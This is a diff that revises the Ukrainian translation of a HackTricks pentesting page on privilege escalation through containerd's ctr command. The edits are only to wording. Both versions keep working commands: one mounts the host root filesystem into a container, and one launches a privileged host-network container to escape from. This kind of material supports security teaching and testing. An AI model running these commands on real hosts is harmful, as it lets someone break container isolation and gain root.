@@ -1,11 +1,10 @@
-# Containerd (ctr) Privilege Escalation
+# Privilege Escalation у Containerd (ctr)
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Основна інформація
 
-Перейдіть за наведеним нижче посиланням, щоб дізнатися, **де `containerd` і `ctr` знаходяться в стеку контейнерів**:
-
+Перейдіть за наведеним нижче посиланням, щоб дізнатися, **де `containerd` і `ctr` розташовані в стеку контейнерів**:
 
 {{#ref}}
 container-security/runtimes-and-engines.md
@@ -13,7 +12,7 @@ container-security/runtimes-and-engines.md
 
 ## PE 1
 
-Якщо ви виявили, що на хості є команда `ctr`:
+якщо ви виявили, що хост містить команду `ctr`:
 ```bash
 which ctr
 /usr/bin/ctr
@@ -25,19 +24,18 @@ REF                                  TYPE                                       
 registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
 registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
 ```
-А потім **запустіть один із цих образів, змонтувавши до нього кореневу папку хоста**:
+А потім **запустіть один із цих образів, змонтувавши до нього кореневий каталог хоста**:
 ```bash
 ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
 ```
 ## PE 2
 
-Запустіть привілейований container і вийдіть із нього.\
-Ви можете запустити привілейований container так:
+Запустіть privileged container і виконайте escape з нього.\
+Ви можете запустити privileged container так:
 ```bash
 ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
 ```
-Тоді ви можете скористатися деякими техніками, згаданими на наступній сторінці, щоб **вийти з нього, зловживаючи привілейованими capabilities**:
-
+Тоді ви можете скористатися деякими техніками, згаданими на наступній сторінці, щоб **втекти з нього, зловживаючи привілейованими capabilities**:
 
 {{#ref}}
 container-security/
